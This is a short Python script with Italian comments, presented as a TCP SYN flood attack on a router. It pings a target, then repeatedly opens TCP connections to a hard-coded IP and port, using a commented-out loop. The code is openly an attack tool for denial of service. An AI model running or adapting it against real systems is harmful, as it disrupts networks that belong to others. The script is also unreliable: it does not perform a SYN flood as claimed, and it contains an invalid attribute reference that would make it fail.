#questo codice lancia un attacco TCP SYN flood contro il router
import socket
import subprocess
import time
def is_host_reachable(host_ip):
  """Verifica se l'host è raggiungibile.

  Args:
    host_ip: L'indirizzo IP dell'host da verificare.

  Returns:
    True se l'host è raggiungibile, False altrimenti.
  """

  return subprocess.run(["ping", "-c", "3", host_ip],
                         capture_output=True,
                         text=True).returncode == 0
def attack(target_ip, terget_port):
    if not is_host_reachable(target_ip):
        raise ValueError("L'host non è raggiungibile.")
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET,sock.So_REUSEADDR,1)
        sock.connect((target_ip,terget_port))
        sock.send(b" ")
        sock.close()

#if __name__=="__main__":
    #target_ip="192.165.38.130"
    #target_port=88
    #while True:
        #attack(target_ip, target_port)
        #time.sleep(0.10)
